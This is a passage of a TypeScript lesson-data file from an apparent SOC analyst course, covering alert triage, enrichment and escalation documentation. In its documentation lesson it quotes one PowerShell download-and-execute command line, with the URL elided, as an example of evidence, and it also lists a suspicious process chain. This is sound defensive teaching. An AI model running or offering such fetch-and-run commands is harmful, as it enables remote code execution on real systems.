Source: 192.168.100.50
Target: Multiple internal hosts
Ports: 22, 80, 443, 3389

Analysis:
✓ Source is known vulnerability scanner
✓ Scan matches scheduled assessment window
✓ Security team confirmed authorized activity
✓ Same pattern every Tuesday

Verdict: FALSE POSITIVE
Recommendation: Add scanner to allowlist
\`\`\`

## Investigation Techniques

### 1. IOC Verification

\`\`\`
Check IP/Domain/Hash against:
├── VirusTotal
├── AbuseIPDB
├── URLhaus
├── AlienVault OTX
├── Internal threat intel
└── Historical data

Scoring:
• Flagged by multiple sources = Higher confidence malicious
• Clean everywhere = Likely benign
• Mixed results = Needs more investigation
\`\`\`

### 2. Behavioral Analysis

Compare to baseline:
- Is this normal for this user?
- Is this normal for this system?
- Is this normal for this time?
- Is this normal for this network?

### 3. Process Chain Analysis

Examine parent-child relationships:

**Suspicious Chain:**
\`\`\`
outlook.exe → powershell.exe → cmd.exe → whoami.exe
(Email client spawning scripting interpreter = BAD)
\`\`\`

**Normal Chain:**
\`\`\`
explorer.exe → powershell.exe (user opened)
services.exe → svchost.exe (system process)
\`\`\`

### 4. Timeline Correlation

Look for related events:
- What happened before?
- What happened after?
- Are there similar events on other systems?

## When You're Unsure

If you can't determine TP vs FP:

1. **Document your analysis** - What you checked, what you found
2. **Escalate to L2** - Don't guess on high-severity alerts
3. **Err on the side of caution** - Better to escalate than miss
4. **Request additional context** - Contact asset owner if needed
5. **Set follow-up reminder** - Monitor for additional activity
    `,
    keyTakeaways: [
      "True positives show malicious IOCs, unusual behavior, and attack patterns",
      "False positives often involve security tools, scheduled tasks, or overly broad rules",
      "Use multiple verification sources for IOC analysis",
      "Analyze process chains and behavioral baselines",
      "When uncertain, document thoroughly and escalate"
    ]
  },
  {
    id: "5.4",
    courseId: "soc-fundamentals",
    title: "Enrichment & Context Gathering",
    content: `
# Enrichment & Context Gathering

Enrichment adds valuable context to alerts, transforming raw data into actionable intelligence. This lesson covers the tools and techniques for effective enrichment.

## What is Enrichment?

**Enrichment** is the process of adding context and intelligence to security data to aid investigation and decision-making.

\`\`\`
Raw Alert:                    Enriched Alert:
IP: 203.0.113.50      →      IP: 203.0.113.50
                              • Location: Russia
                              • Reputation: Malicious (95%)
                              • Associated: Cobalt Strike C2
                              • First seen: 2024-01-10
                              • Our exposure: 3 connections
\`\`\`

## Types of Enrichment

### 1. Threat Intelligence

**IOC Reputation:**
- IP address reputation
- Domain categorization
- File hash detection
- URL analysis

**Contextual Intel:**
- Associated malware families
- Threat actor attribution
- Campaign information
- TTPs used

### 2. Asset Context

**System Information:**
- Hostname and IP
- Operating system
- Installed software
- Business function
- Owner/custodian

**Criticality:**
- Business importance
- Data sensitivity
- Internet exposure
- Compliance scope

### 3. User Context

**Identity Information:**
- Full name and title
- Department
- Manager
- Account type

**Behavioral Baseline:**
- Normal working hours
- Typical locations
- Common activities
- Privilege level

### 4. Historical Context

**Previous Activity:**
- Past alerts on same asset
- Past alerts for same user
- Similar patterns in environment
- Known false positive patterns

## Enrichment Tools

### Free OSINT Tools

| Tool | Purpose | URL |
|------|---------|-----|
| VirusTotal | File/IP/URL analysis | virustotal.com |
| AbuseIPDB | IP reputation | abuseipdb.com |
| Shodan | Internet device search | shodan.io |
| URLhaus | Malicious URL database | urlhaus.abuse.ch |
| MalwareBazaar | Malware samples | bazaar.abuse.ch |
| AlienVault OTX | Threat intel sharing | otx.alienvault.com |

### Commercial Platforms

- Recorded Future
- ThreatConnect
- Anomali
- Mandiant Advantage

### Internal Sources

\`\`\`
Asset Database (CMDB)
├── System inventory
├── Business owners
├── Criticality ratings
└── Network location

Identity System (AD/IAM)
├── User attributes
├── Group memberships
├── Account status
└── Privilege level

SIEM Historical Data
├── Previous alerts
├── User activity logs
└── Connection history
\`\`\`

## Enrichment Workflow

### Step 1: Extract IOCs

From the alert, identify:
\`\`\`
□ IP addresses (source and destination)
□ Domain names
□ File hashes (MD5, SHA1, SHA256)
□ URLs
□ Email addresses
□ File names
\`\`\`

### Step 2: Query Reputation

For each IOC:
\`\`\`
1. Check VirusTotal
   - Detection ratio
   - Behavioral analysis
   - Community comments

2. Check AbuseIPDB (for IPs)
   - Abuse reports
   - Categories
   - Confidence score

3. Check internal TIP
   - Previous sightings
   - Associated incidents
\`\`\`

### Step 3: Gather Asset Context

\`\`\`
Query CMDB/Asset Database:
├── What type of system?
├── What does it do?
├── Who owns it?
├── How critical is it?
└── What network zone?
\`\`\`

### Step 4: Gather User Context

\`\`\`
Query Identity System:
├── Who is this user?
├── What's their role?
├── What access do they have?
├── Is this normal behavior?
└── Are they currently active?
\`\`\`

### Step 5: Check Historical Data

\`\`\`
Query SIEM:
├── Previous alerts for this asset?
├── Previous alerts for this user?
├── Previous connections to this destination?
├── Similar activity across environment?
└── Known false positive pattern?
\`\`\`

## Automation Opportunities

### Auto-Enrichment

Many SOCs automate enrichment:

\`\`\`yaml
on_alert:
  - extract_iocs
  - lookup_virustotal(iocs.ips, iocs.hashes, iocs.domains)
  - lookup_abuseipdb(iocs.ips)
  - query_cmdb(alert.host)
  - query_identity(alert.user)
  - attach_results_to_alert
\`\`\`

### Benefits of Automation:
- Faster triage
- Consistent enrichment
- Reduced analyst workload
- Better decision support
    `,
    keyTakeaways: [
      "Enrichment adds threat intel, asset, user, and historical context to alerts",
      "Use free OSINT tools like VirusTotal, AbuseIPDB, and Shodan",
      "Query internal systems (CMDB, IAM) for asset and user context",
      "Check historical data for previous alerts and known patterns",
      "Automate enrichment to speed up triage and ensure consistency"
    ]
  },
  {
    id: "5.5",
    courseId: "soc-fundamentals",
    title: "Documentation & Escalation",
    content: `
# Documentation & Escalation

Proper documentation and timely escalation are critical for effective incident response and organizational learning. This lesson covers best practices for both.

## Why Documentation Matters

**For the Current Incident:**
- Enables continuity across shifts
- Supports escalation to L2/L3
- Provides evidence for response

**For the Organization:**
- Enables pattern recognition
- Supports metrics and reporting
- Facilitates post-incident review
- Meets compliance requirements

## Documentation Standards

### Ticket/Alert Documentation

Every ticket should contain:

\`\`\`markdown
## Alert Information
- Alert ID: [ID]
- Detection Rule: [Rule Name]
- Severity: [Level]
- Time Detected: [Timestamp]

## Affected Assets
- Hostname: [Name]
- IP Address: [IP]
- User: [Username]
- Department: [Dept]

## Investigation Summary
[Brief description of what was found]

## Investigation Steps
1. [Step taken and result]
2. [Step taken and result]
3. [Step taken and result]

## IOCs Identified
- [Type]: [Value] - [Status]

## Conclusion
[True Positive / False Positive / Needs Escalation]

## Actions Taken
- [Action 1]
- [Action 2]

## Recommendations
[Future improvements or follow-up needed]

## Analyst
- Name: [Your name]
- Time: [Completion time]
\`\`\`

### Documentation Best Practices

**Be Specific:**
\`\`\`
❌ "Checked the logs, looked suspicious"
✓ "Reviewed Windows Security logs, found 47 failed logins 
   (Event ID 4625) from IP 192.168.1.100 between 14:00-14:15"
\`\`\`

**Include Evidence:**
\`\`\`
❌ "User ran a bad command"
✓ "Process: powershell.exe
   Command: IEX (New-Object Net.WebClient).DownloadString('http://...')
   Parent: WINWORD.EXE
   Time: 2024-01-15 14:30:00"
\`\`\`

**Be Objective:**
\`\`\`
❌ "This is definitely malware"
✓ "Hash matches known Emotet sample per VirusTotal (58/71 detections)"
\`\`\`

## Escalation Guidelines

### When to Escalate Immediately

**Critical Situations:**
- Active ransomware
- Confirmed data exfiltration
- Compromised privileged account
- Business-critical system affected
- C2 communication detected

### When to Escalate After Triage

**High-Priority Situations:**
- Confirmed malware requiring containment
- Complex investigation beyond L1 scope
- Multiple systems affected
- Insider threat indicators
- Unknown or novel attack

### Escalation Checklist

Before escalating:

\`\`\`
□ Document all findings so far
□ Preserve relevant evidence (screenshots, logs)
□ List affected systems and users
□ Note any containment actions taken
□ Provide timeline of events
□ Include all IOCs discovered
□ State your assessment and confidence level
\`\`\`

### Escalation Template

\`\`\`markdown
## ESCALATION - [Severity] - [Brief Title]

### Summary
[2-3 sentence description of the situation]

### Why Escalating
[Reason this needs L2/L3 attention]

### Timeline
| Time | Event |
|------|-------|
| 14:00 | Initial alert triggered |
| 14:05 | Began triage |
| 14:15 | Found additional indicators |

### Affected Assets
- [List all affected systems/users]

### IOCs
- IP: 192.168.1.100 - Flagged malicious
- Hash: abc123... - Known Emotet

### Investigation So Far
1. [What you checked]
2. [What you found]
3. [What you couldn't determine]

### Recommended Next Steps
- [Suggested actions for L2]

### Analyst
[Your name] | [Time] | [Contact]
\`\`\`

## Escalation Paths

\`\`\`
                    ┌─────────────────┐
                    │  Critical/      │
                    │  Active Breach  │
                    └────────┬────────┘
                             │
                             ↓
┌─────────────┐    ┌─────────────────┐    ┌─────────────────┐
│  L1 Analyst │ → │  L2 Analyst     │ → │  L3 / IR Lead   │
└─────────────┘    └─────────────────┘    └─────────────────┘
       │                    │                      │
       ↓                    ↓                      ↓
  Standard           Deep                    Major
  Triage           Investigation            Incident

                             │
                             ↓
                    ┌─────────────────┐
                    │  SOC Manager    │
                    │  (Major Events) │
                    └─────────────────┘
\`\`\`

## Communication During Escalation

**What L2 Needs to Know:**
- What triggered your investigation
- What you found (with evidence)
- What you couldn't determine
- Current status of affected assets
- Any time-sensitive factors

**How to Communicate:**
- Use designated escalation channels
- Be concise but complete
- Provide ticket/case reference
- Remain available for questions
    `,
    keyTakeaways: [
      "Document every investigation with specific details and evidence",
      "Use structured templates for consistent documentation",
      "Escalate immediately for active breaches and critical situations",
      "Complete the escalation checklist before handing off",
      "Provide clear context so L2 can continue without re-investigating"
    ],
    practicalExercise: {
      title: "Create Escalation Documentation",
      description: "Practice documenting an alert and preparing an escalation.",
      steps: [
        "Review the provided alert scenario",
        "Document your triage steps and findings",
        "Determine if escalation is needed",
        "Complete an escalation template",
        "Identify any missing information for the handoff"
      ]
    }
  }
];

export const getLessonContent = (courseId: string, lessonId: string): LessonContent | undefined => {
  return lessonContents.find(
    (lesson) => lesson.courseId === courseId && lesson.id === lessonId
  );
};

export const getCourseLessons = (courseId: string): LessonContent[] => {
  return lessonContents.filter((lesson) => lesson.courseId === courseId);
};
